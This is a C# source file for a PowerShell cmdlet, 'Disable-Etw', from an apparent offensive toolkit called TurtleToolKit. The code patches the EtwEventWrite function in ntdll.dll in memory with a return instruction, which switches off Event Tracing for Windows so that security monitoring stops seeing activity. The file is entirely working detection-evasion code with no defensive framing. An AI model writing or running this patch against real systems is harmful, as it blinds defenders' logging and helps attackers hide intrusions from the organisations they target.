using System;
using System.Management.Automation;
using System.Runtime.InteropServices;
using TurtleToolKitManaged;

namespace TurtleToolKit
{
    [Cmdlet(VerbsLifecycle.Disable, "Etw")] // <- seeting cmdlet name and verbs
    [Alias("DETW")] //<- cmdlet alias
    public class DisableEtw : Cmdlet
    {
        protected override void BeginProcessing()
        {
            base.BeginProcessing();
        }

        // Process each item in pipeline
        protected override void ProcessRecord()
        {
            base.ProcessRecord();
            if (!ExecuteEtxPatch())
            {
                WriteWarning("Failed to disable etw");
            }
            WriteVerbose("Sucessfully disabled etw");
        }
        // EndProcessing Used to clean up cmdlet
        protected override void EndProcessing() { base.EndProcessing(); }
        // Handle abnormal termination
        protected override void StopProcessing() { base.StopProcessing(); }
        //
        public static bool ExecuteEtxPatch()
        {
            try
            {
                // inserting ret instruction
                byte[] patch = new byte[2];
                patch[0] = 0xC3;
                patch[1] = 0x00;
                var lib = Win32.LoadLibrary("ntdll.dll");
                var addy = Win32.GetProcAddress(lib, "EtwEventWrite");
                Win32.VirtualProtect(addy, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
                Marshal.Copy(patch, 0, addy, patch.Length);
                Win32.VirtualProtect(addy, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                return true;
            } catch (Exception e)
            {
                Console.WriteLine(e);
                return false;
            }
        }

    }
}
